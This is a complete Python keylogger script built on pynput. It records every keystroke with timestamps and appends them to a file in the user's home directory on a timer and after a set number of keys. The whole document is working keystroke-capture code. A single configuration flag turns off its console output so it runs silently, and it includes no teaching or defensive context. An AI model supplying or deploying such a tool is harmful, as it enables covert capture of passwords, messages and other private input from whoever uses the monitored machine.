from pynput import keyboard
import time
import threading
from datetime import datetime
import sys
import os

# Simple config
LOG_FILE = os.path.expanduser("~/simple_keylog.txt")  # User home dir (writable); change if needed, e.g., "C:\\temp\\simple_keylog.txt"
FLUSH_INTERVAL = 60  # 1 minute in seconds
FLUSH_ON_KEYS = 10  # Flush every N keys as fallback (set to 0 to disable)
ENABLE_TIMESTAMPS = True  # Set to False for no timestamps
DEBUG_PRINTS = True  # Set to False for less output

# Globals
buffer = []
running = True
listener = None
key_count = 0  # Track keys for fallback flush

def get_timestamp():
    """Simple timestamp helper."""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S") if ENABLE_TIMESTAMPS else ""

def on_press(key):
    """Handle key press: add to buffer and print. Stop on Esc."""
    global key_count
    try:
        if key == keyboard.Key.esc:  # Backup stop: Press Esc to quit
            print("\nEsc pressed - stopping...")
            stop_keylogger()
            return False  # Stop listener

        if hasattr(key, 'char') and key.char is not None:
            char = key.char
        else:
            char = f"[{str(key).split('.')[-1].upper()}]"
        
        timestamp = get_timestamp()
        entry = f"{timestamp} {char}" if timestamp else char
        buffer.append(entry)
        key_count += 1
        
        if DEBUG_PRINTS:
            print(entry)  # Real-time console output
        
        # Fallback flush every N keys
        if FLUSH_ON_KEYS > 0 and key_count % FLUSH_ON_KEYS == 0:
            flush_buffer()
            
    except Exception as e:
        if DEBUG_PRINTS:
            print(f"Key error: {e}")

def flush_buffer():
    """Flush buffer to file."""
    global key_count
    if not buffer:
        if DEBUG_PRINTS:
            print("Buffer empty - no flush needed.")
        return
    
    try:
        # Ensure dir exists
        os.makedirs(os.path.dirname(LOG_FILE) or '.', exist_ok=True)
        
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write('\n'.join(buffer) + '\n\n')  # Batch write with separator
        flushed_count = len(buffer)
        buffer.clear()
        key_count = 0  # Reset for fallback
        
        if DEBUG_PRINTS:
            print(f"Flushed {flushed_count} entries to {LOG_FILE} (size now: {os.path.getsize(LOG_FILE) if os.path.exists(LOG_FILE) else 0} bytes)")
            
    except Exception as e:
        if DEBUG_PRINTS:
            print(f"Flush error: {e}. Trying temp file...")
            # Fallback to temp file
            temp_file = LOG_FILE + ".temp"
            try:
                with open(temp_file, 'a', encoding='utf-8') as f:
                    f.write('\n'.join(buffer) + '\n\n')
                print(f"Saved to temp: {temp_file}")
                buffer.clear()
            except Exception as e2:
                print(f"Temp save failed too: {e2}")

def interval_flush():
    """Background thread for interval flushes."""
    while running:
        time.sleep(FLUSH_INTERVAL)
        if running:
            flush_buffer()

def stop_keylogger():
    """Stop everything and final flush."""
    global running
    running = False
    flush_buffer()  # Final flush
    if listener:
        listener.stop()
    if DEBUG_PRINTS:
        print("Keylogger stopped.")

# Start interval flush thread (daemon)
flush_thread = threading.Thread(target=interval_flush, daemon=True)
flush_thread.start()

if DEBUG_PRINTS:
    print(f"Fixed simple keylogger started. Log file: {LOG_FILE}")
    print("Type keys... Flushes every 60s or {FLUSH_ON_KEYS} keys. Stop with Ctrl+C or Esc.")

# Start listener in daemon thread (non-blocking)
def run_listener():
    global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()  # Blocks this thread only

listener_thread = threading.Thread(target=run_listener, daemon=True)
listener_thread.start()

# Main thread: Wait for interrupt (non-blocking)
try:
    while running:
        time.sleep(1)
except KeyboardInterrupt:
    if DEBUG_PRINTS:
        print("\nCtrl+C pressed - shutting down...")
    stop_keylogger()
    sys.exit(0)
